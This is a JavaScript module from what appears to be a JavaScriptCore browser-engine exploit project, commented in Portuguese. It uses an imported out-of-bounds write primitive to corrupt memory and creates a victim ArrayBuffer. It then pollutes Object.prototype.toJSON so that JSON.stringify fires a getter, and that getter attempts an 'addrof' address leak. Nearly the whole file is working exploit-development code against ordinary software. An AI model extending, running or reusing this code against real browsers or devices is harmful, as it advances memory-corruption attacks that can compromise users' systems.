// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAddrOfTest"; // Novo nome para clareza
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", leaked_info: null, error: null };

// Variável para o AB vítima "fresco"
let fresh_victim_ab_for_addrof_test;

class CheckpointObjectForAddrOfTest {
    constructor(id) {
        this.id = `AddrOfCheckpoint-${id}`;
    }
}

export function toJSON_TriggerAddrOfTestGetter() {
    const FNAME_toJSON = "toJSON_TriggerAddrOfTestGetter";
    if (this instanceof CheckpointObjectForAddrOfTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

// A função exportada mantém o nome para compatibilidade
export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeAddrOfSpeculativeTest"; // Nome interno do teste
    logS3(`--- Iniciando Teste "AddressOf" Especulativo ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    fresh_victim_ab_for_addrof_test = null;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", leaked_info: null, error: null };

    // Validações de config... (simplificado para brevidade, assumindo que estão ok)
    if (!JSC_OFFSETS.ArrayBufferContents) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Escrita OOB "gatilho"
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar um ArrayBuffer Vítima "Fresco" *APÓS* a escrita OOB gatilho
        const victim_ab_size = 32; // Tamanho pequeno para facilitar a observação
        logS3(`Criando ArrayBuffer vítima "fresco" (fresh_victim_ab_for_addrof_test) com tamanho ${victim_ab_size}...`, "info", FNAME_TEST);
        fresh_victim_ab_for_addrof_test = new ArrayBuffer(victim_ab_size);
        // Escrever alguns valores conhecidos nele
        try {
            new DataView(fresh_victim_ab_for_addrof_test).setUint32(0, 0x41414141, true);
            new DataView(fresh_victim_ab_for_addrof_test).setUint32(4, 0x42424242, true);
        } catch (e) { logS3("Erro ao preencher AB vítima fresco.", "error", FNAME_TEST); }
        logS3(`fresh_victim_ab_for_addrof_test criado. byteLength inicial: ${fresh_victim_ab_for_addrof_test?.byteLength}`, "info", FNAME_TEST);


        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForAddrOfTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                getter_called_flag = true;
                const FNAME_GETTER = "AddrOfTest_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando addrof especulativo...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, teste addrof em andamento.", leaked_info: null, error: null };

                let target_obj_for_addrof = fresh_victim_ab_for_addrof_test; // Ou oob_array_buffer_real
                if (!target_obj_for_addrof) {
                    logS3("DENTRO DO GETTER: Objeto alvo para addrof (fresh_victim_ab_for_addrof_test) é null!", "error", FNAME_GETTER);
                    current_test_results.message = "Objeto alvo para addrof era nulo.";
                    return 0xDEAD;
                }

                logS3(`DENTRO DO GETTER: Objeto alvo para addrof: ${Object.prototype.toString.call(target_obj_for_addrof)}, byteLength: ${target_obj_for_addrof.byteLength}`, "info", FNAME_GETTER);

                try {
                    // Tentativa 1: Alguma propriedade foi corrompida para se tornar um número (ponteiro)?
                    // Iterar sobre as propriedades e ver se alguma parece um endereço (grande número).
                    // Isso é muito improvável de funcionar diretamente no JS.
                    for (const key in target_obj_for_addrof) {
                        try {
                            const val = target_obj_for_addrof[key];
                            if (typeof val === 'number' && (val > 0x100000000 || val < -0x100000000)) { // Heurística para um possível endereço
                                logS3(`DENTRO DO GETTER: Propriedade suspeita '${key}' em target_obj: ${toHex(val, 64)}`, "leak", FNAME_GETTER);
                                current_test_results.leaked_info = `Propriedade '${key}': ${toHex(val, 64)}`;
                                current_test_results.success = true; // Sucesso especulativo
                            }
                        } catch (e_prop) { /* ignorar erros de acesso a propriedades estranhas */ }
                    }

                    // Tentativa 2: Tentar forçar conversão para string ou número de uma forma que possa vazar.
                    // Se target_obj_for_addrof (um ArrayBuffer) foi corrompido para ser, por exemplo, um JSString contendo um endereço,
                    // ou se seu método toString foi alterado.
                    const stringified_target = String(target_obj_for_addrof);
                    logS3(`DENTRO DO GETTER: String(target_obj_for_addrof) = "${stringified_target}"`, "info", FNAME_GETTER);
                    if (stringified_target.toLowerCase().includes("0x")) { // Heurística muito fraca
                        current_test_results.leaked_info = `String(target_obj) suspeita: ${stringified_target}`;
                         // Não marcar como sucesso ainda, muito fraco
                    }


                    // Tentativa 3: Interagir com o butterfly (se aplicável e se pudermos acessá-lo)
                    // Esta é a parte mais difícil e geralmente requer uma primitiva de leitura arbitrária já estabelecida.
                    // Sem isso, só podemos observar o comportamento externo.
                    // Por exemplo, se target_obj_for_addrof fosse um Array e seu butterfly fosse corrompido para conter
                    // o ponteiro da Structure como um elemento.
                    if (Array.isArray(target_obj_for_addrof)) {
                        if (target_obj_for_addrof.length > 0 && typeof target_obj_for_addrof[0] === 'number' && target_obj_for_addrof[0] > 0x100000) {
                            logS3(`DENTRO DO GETTER: Primeiro elemento do array alvo (se for array) é um número grande: ${toHex(target_obj_for_addrof[0], 64)}`, "leak", FNAME_GETTER);
                            current_test_results.leaked_info = `Array[0]: ${toHex(target_obj_for_addrof[0], 64)}`;
                            current_test_results.success = true;
                        }
                    }


                    if (!current_test_results.success) {
                        current_test_results.message = "Nenhum vazamento de endereço óbvio ou corrupção útil observada no getter.";
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO durante tentativa de addrof especulativo: ${e.message}`, "error", FNAME_GETTER);
                    current_test_results.error = String(e);
                    current_test_results.message = `Erro no getter: ${e.message}`;
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerAddrOfTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
        if (getterPollutionApplied && CheckpointObjectForAddrOfTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForAddrOfTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ADDRSPEC: ${current_test_results.message} LEAK: ${current_test_results.leaked_info}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE ADDRSPEC: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE ADDRSPEC: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    fresh_victim_ab_for_addrof_test = null; // Limpa a referência global
    logS3(`--- Teste "AddressOf" Especulativo Concluído ---`, "test", FNAME_TEST);
}
